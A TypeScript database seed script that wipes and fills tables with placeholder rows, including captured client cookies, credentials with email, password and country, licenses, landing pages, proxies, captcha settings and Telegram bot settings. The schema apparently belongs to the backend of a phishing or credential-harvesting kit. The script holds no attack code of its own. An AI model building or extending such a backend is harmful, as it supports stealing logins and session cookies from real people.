import { mainDb, configDb, securityDb } from "./db";

import {
  clients,
  clientCookies,
  credentials,
  licenses,
  adminSessions,
  proxySettings,
  proxies,
  domains,
  telegramNotifications,
  
  landingPages,
  defaultServices,
  singleLinkSettings,
  captchaSettings
} from "./schema/main.schema";

import {
  settings,
} from "./schema/config.schema";

import {
  tokens,
  ipLog,
  trackingCookies,
} from "./schema/security.schema";

async function seed() {
  console.log("🌱 Seeding database...");

  await mainDb.delete(clientCookies);
    await mainDb.delete(credentials);
    await mainDb.delete(clients);

    await securityDb.delete(tokens);
    await securityDb.delete(ipLog);
    await securityDb.delete(trackingCookies);
    await securityDb.delete(settings);
    await mainDb.delete(proxySettings);
    await mainDb.delete(proxies);
    await mainDb.delete(domains);
    await mainDb.delete(telegramNotifications);
    await mainDb.delete(landingPages);
    await mainDb.delete(defaultServices);
    await mainDb.delete(singleLinkSettings);
    await mainDb.delete(captchaSettings);
    await mainDb.delete(adminSessions);

    await mainDb.delete(licenses);

  // CLIENTS
  await mainDb.insert(clients).values([
    {
      sessionId: "sess_1",
      client_ip: "192.168.1.1",
      first_seen: new Date().toISOString(),
      last_seen: new Date().toISOString(),
    },
    {
      sessionId: "sess_2",
      client_ip: "192.168.1.2",
      first_seen: new Date().toISOString(),
      last_seen: new Date().toISOString(),
    },
  ]);

  // COOKIES
  await mainDb.insert(clientCookies).values([
    {
      sessionId: "sess_1",
      timestamp: new Date().toISOString(),
      cookies: JSON.stringify({
        token: "abc123",
      }),
    },
  ]);

  // CREDENTIALS
  await mainDb.insert(credentials).values([
    {
      sessionId: "sess_1",
      timestamp: new Date().toISOString(),
      email: "admin@example.com",
      password: "password123",
      country: "Nigeria",
    },
  ]);

  // SETTINGS

const settingsData = [
  {
    key: "BOT_TOKEN",
    value: "123456",
  },
  {
    key: "CHAT_ID",
    value: "999999",
  },
];

for (const item of settingsData) {
  await configDb
    .insert(settings)
    .values(item)
    .onConflictDoUpdate({
      target: settings.key,
      set: {
        value: item.value,
      },
    });
}

  // TOKENS
  await securityDb.insert(tokens).values([
    {
      token: "token_123",
      created_at: Math.floor(Date.now() / 1000),
    },
  ]);

  // IP LOGS
  await securityDb.insert(ipLog).values([
    {
      ip: "127.0.0.1",
      timestamp: Date.now(),
    },
  ]);

  // TRACKING COOKIES
  await securityDb.insert(trackingCookies).values([
    {
      cookie_value: "cookie_123",
      ip: "127.0.0.1",
      created_at: Math.floor(Date.now() / 1000),
    },
  ]);

  console.log("✅ Database seeded successfully");
}

seed().catch(console.error);